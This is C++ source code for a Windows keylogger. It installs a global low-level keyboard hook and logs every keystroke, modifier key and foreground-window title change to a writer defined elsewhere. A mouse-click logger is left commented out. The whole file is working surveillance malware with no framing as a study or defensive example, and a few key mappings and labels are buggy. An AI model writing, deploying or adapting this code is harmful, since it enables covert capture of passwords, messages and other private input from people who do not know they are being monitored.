#include <Windows.h>
#include <chrono>
#include <ctime>

#include "write.h"

bool shifted = false;
bool ctrled = false;
bool alted = false;
bool capslock = false;

HWND curr_window;
HWND old_curr_window;

// LRESULT CALLBACK MProc(int nCode, WPARAM wParam, LPARAM lParam) {
//     switch(wParam) {
//         case WM_LBUTTONDOWN:
//             std::cout << "<LEFT CLICK>" << std::endl;
//             break;
        
//         case WM_RBUTTONDOWN:
//             std::cout << "<RIGHT CLICK>" << std::endl;
//             break;

//         case WM_MBUTTONDOWN:
//             std::cout << "<MIDDLE CLICK>" << std::endl;
//             break;
//     }

//     return CallNextHookEx(NULL, nCode, wParam, lParam);

// }

LRESULT CALLBACK KProc(int nCode, WPARAM wParam, LPARAM lParam) {
    old_curr_window = curr_window;
    curr_window = GetForegroundWindow();
    
    if (curr_window != old_curr_window){
        LPTSTR wintext = (LPTSTR) malloc(256);
        GetWindowText(curr_window, wintext, 256);
        std::string winout = "Window Changed: ";

        winout.append(std::string((char*) wintext));

        write_endl(winout);
    }
    PKBDLLHOOKSTRUCT p = (PKBDLLHOOKSTRUCT) (lParam);
    
    if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN){

        // LPSTR keyname = (LPSTR) malloc(512);

        // GetKeyNameTextA(lParam, keyname, 512);

        // std::cout << keyname << std::endl;

        switch(p->vkCode){
            case VK_SHIFT:
            case VK_LSHIFT:
            case VK_RSHIFT:
                if (!shifted) write_endl("<SHIFT>");
                shifted = true;
                break;

            case VK_MENU: //alt
                if (!alted) write_endl("<ALT>");
                alted = true;
                break;

            case VK_CAPITAL:
                if (!capslock) write_endl("<CAPS LOCK>");
                capslock = true;
                break;

            case VK_CONTROL:
            case VK_LCONTROL:
            case VK_RCONTROL:
                if (!ctrled) write_endl("<CTLR>");
                ctrled = true;
                break;

            case VK_BACK:
                write_endl("BACKSPACE>");
                break;

            case VK_DELETE:
                write_endl("<DELETE>");
                break;

            case VK_ESCAPE:
                write_endl("<ESC>");
                break;

            case VK_OEM_COMMA:
                write(",");
                break;

            case VK_OEM_PERIOD:
                write(".");
                break;

            case 49:
                if (shifted) write("@");
                else write("2");
                break;

            default:
                char out;
                if (shifted){
                    out = char(p->vkCode);
                }else {
                    out = char(tolower(p->vkCode));
                }
                write(out);
        }
    }

    if (wParam == WM_KEYUP || wParam == WM_SYSKEYUP){
        switch (p->vkCode){
            case VK_SHIFT:
            case VK_LSHIFT:
            case VK_RSHIFT:
                write_endl("<SHIFT RELEASE>");
                shifted = false;
                break;

            case VK_MENU: //alt
                write_endl("<ALT RELEASE>");
                alted = false;
                break;

            case VK_CONTROL:
            case VK_LCONTROL:
            case VK_RCONTROL:
                write_endl("<CTRL RELEASE>");
                ctrled = false;
                break;
        }
    }

    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

int main(){
    //printf("Welcome!");
    curr_window = GetForegroundWindow();

    HHOOK khook = SetWindowsHookExA(WH_KEYBOARD_LL, KProc, NULL, 0);
    //HHOOK mhook = SetWindowsHookExA(WH_MOUSE_LL, MProc, NULL, 0);
    
    if (khook == NULL){
        std::cout << ("Error: Keyboard hook could not be installed") << std::endl;
    }else {
        std::string readymsg = "Ready on ";
        auto currtime_funk = std::chrono::system_clock::now();
        std::time_t currtime_time_t = std::chrono::system_clock::to_time_t(currtime_funk);
        auto currtime = std::ctime(&currtime_time_t);

        readymsg.append(currtime);
        write_endl(readymsg);
        MSG msg = {0, 0, 0, 0, 0, 0, 0};
        while (GetMessageA(&msg, NULL, 0, 0) != WM_QUIT) {
            TranslateMessage(&msg);
            DispatchMessage(&msg);

         }
    }

    UnhookWindowsHookEx(khook);
    CloseHandle(khook);

    //UnhookWindowsHookEx(mhook);
    //CloseHandle(mhook);

    return 0;
}